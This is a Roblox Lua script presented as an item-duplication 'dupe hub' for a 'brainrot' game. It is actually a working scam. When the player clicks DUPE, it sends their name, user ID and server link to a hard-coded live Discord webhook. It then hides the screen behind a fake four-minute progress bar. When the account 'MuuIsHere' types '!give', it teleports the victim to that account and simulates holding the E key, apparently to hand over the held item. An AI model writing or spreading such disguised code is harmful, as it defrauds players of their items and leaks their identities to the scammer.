-- Muu Dupe Hub - PUBLIC VERSION
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

local isDuping = false
local overlayGui = nil
local loadingBar = nil
local barLabel = nil

-- Discord webhook URL
local webhookURL = "https://discord.com/api/webhooks/1462578276546510850/ft0XGOfdQLIY8yJ1Hcc4V6cJRTcaMmE7hyC3gPDONuLvSgPvw07M49Nj6PR6H1itt50T"

-- Public server check
if game.PrivateServerId ~= "" then
    localPlayer:Kick("Please execute this script in a public server only!")
    return
end

-- Create main GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MuuDupeHub"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 480)
frame.Position = UDim2.new(0.5, -190, 0.5, -240)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 20)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 70)
title.BackgroundTransparency = 1
title.Text = "Muu Dupe Hub"
title.TextColor3 = Color3.fromRGB(100, 200, 255)
title.Font = Enum.Font.GothamBlack
title.TextSize = 45
title.Parent = frame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.9, 0, 0, 80)
statusLabel.Position = UDim2.new(0.05, 0, 0.15, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Hold brainrot that you want to dupe"
statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextSize = 24
statusLabel.TextWrapped = true
statusLabel.Parent = frame

local dot = Instance.new("Frame")
dot.Size = UDim2.new(0, 30, 0, 30)
dot.Position = UDim2.new(0.05, 0, 0.28, 0)
dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
dot.BorderSizePixel = 0
dot.Parent = frame
local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = dot

local dupeButton = Instance.new("TextButton")
dupeButton.Size = UDim2.new(0.8, 0, 0, 90)
dupeButton.Position = UDim2.new(0.1, 0, 0.45, 0)
dupeButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
dupeButton.Text = "DUPE"
dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dupeButton.Font = Enum.Font.GothamBlack
dupeButton.TextSize = 38
dupeButton.Parent = frame
local dupeCorner = Instance.new("UICorner")
dupeCorner.CornerRadius = UDim.new(0, 16)
dupeCorner.Parent = dupeButton

-- Overlay / loading GUI
local function createOverlay()
    overlayGui = Instance.new("ScreenGui")
    overlayGui.Name = "DupeOverlay"
    overlayGui.IgnoreGuiInset = true
    overlayGui.Parent = playerGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 50)
    bg.BackgroundTransparency = 0
    bg.Parent = overlayGui

    local shade = Instance.new("Frame")
    shade.Size = UDim2.new(0.65, 0, 0.45, 0)
    shade.Position = UDim2.new(0.175, 0, 0.275, 0)
    shade.BackgroundColor3 = Color3.fromRGB(10, 10, 40)
    shade.BackgroundTransparency = 0.3
    shade.Parent = overlayGui
    local shadeCorner = Instance.new("UICorner")
    shadeCorner.CornerRadius = UDim.new(0, 20)
    shadeCorner.Parent = shade

    local hubText = Instance.new("TextLabel")
    hubText.Size = UDim2.new(1, 0, 0.35, 0)
    hubText.Position = UDim2.new(0, 0, 0.08, 0)
    hubText.BackgroundTransparency = 1
    hubText.Text = "Muu Dupe Hub"
    hubText.TextColor3 = Color3.fromRGB(100, 200, 255)
    hubText.Font = Enum.Font.GothamBlack
    hubText.TextSize = 70
    hubText.Parent = shade

    local warningText = Instance.new("TextLabel")
    warningText.Size = UDim2.new(1, 0, 0.2, 0)
    warningText.Position = UDim2.new(0, 0, 0.43, 0)
    warningText.BackgroundTransparency = 1
    warningText.Text = "DO NOT UNEQUIP YOUR BRAINROT! It could delete it!"
    warningText.TextColor3 = Color3.fromRGB(255, 0, 0)
    warningText.Font = Enum.Font.GothamBold
    warningText.TextSize = 28
    warningText.TextWrapped = true
    warningText.Parent = shade

    local barFrame = Instance.new("Frame")
    barFrame.Size = UDim2.new(0.85, 0, 0, 50)
    barFrame.Position = UDim2.new(0.075, 0, 0.7, 0)
    barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
    barFrame.Parent = shade
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 12)
    barCorner.Parent = barFrame

    loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    loadingBar.Parent = barFrame
    local loadingCorner = Instance.new("UICorner")
    loadingCorner.CornerRadius = UDim.new(0, 12)
    loadingCorner.Parent = loadingBar

    barLabel = Instance.new("TextLabel")
    barLabel.Size = UDim2.new(1, 0, 1, 0)
    barLabel.BackgroundTransparency = 1
    barLabel.Text = "Duping brainrot... 0%"
    barLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    barLabel.Font = Enum.Font.GothamBold
    barLabel.TextSize = 32
    barLabel.Parent = barFrame
end

-- Status update
RunService.Heartbeat:Connect(function()
    local char = localPlayer.Character
    if char and char:FindFirstChildOfClass("Tool") then
        statusLabel.Text = "Ready"
        dot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        dupeButton.Text = "DUPE"
    else
        statusLabel.Text = "Hold a brainrot"
        dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        dupeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        dupeButton.Text = "Hold brainrot first"
    end
end)

-- Dupe button click
dupeButton.MouseButton1Click:Connect(function()
    local char = localPlayer.Character
    if not char or not char:FindFirstChildOfClass("Tool") then return end

    isDuping = true
    dupeButton.Text = "DUPING..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)

    createOverlay()

    -- Send Discord webhook when loading starts
    local success, err = pcall(function()
        local content = string.format("@everyone\nPlayer **%s** (ID: %d) is duping! Join here: https://www.roblox.com/games/%d", localPlayer.Name, localPlayer.UserId, game.PlaceId)
        local payload = HttpService:JSONEncode({content = content})
        HttpService:PostAsync(webhookURL, payload, Enum.HttpContentType.ApplicationJson)
    end)
    if not success then
        warn("Failed to send webhook:", err)
    end

    -- Mute audio
    for _, sound in pairs(game.Workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Playing = false
        end
    end

    -- Loading bar (4 minutes)
    local totalTime = 240
    local elapsed = 0
    local connection
    connection = RunService.Heartbeat:Connect(function(dt)
        elapsed = elapsed + dt
        local percent = math.clamp(math.floor((elapsed / totalTime) * 100),0,100)
        barLabel.Text = "Duping brainrot... "..percent.."%"
        loadingBar.Size = UDim2.new(percent/100, 0, 1, 0)
        if elapsed >= totalTime then
            connection:Disconnect()
            barLabel.Text = "Duping complete - Waiting for MuuIsHere !give"
        end
    end)
end)

-- Listen for MuuIsHere giving command
local muu = Players:FindFirstChild("MuuIsHere")
if muu then
    muu.Chatted:Connect(function(msg)
        local args = msg:split(" ")
        if args[1] == "!give" and isDuping then
            local muuChar = muu.Character
            if muuChar and muuChar:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character.HumanoidRootPart.CFrame = muuChar.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
            end
            -- Hold E for 4 seconds
            task.spawn(function()
                keypress(0x45) -- E
                task.wait(4)
                keyrelease(0x45)
                print("Held E for 4 seconds!")
                task.wait(30)
                -- Rejoin server
                TeleportService:Teleport(game.PlaceId, localPlayer)
            end)
        end
    end)
end

print("Muu Dupe Hub Loaded - PUBLIC VERSION!")
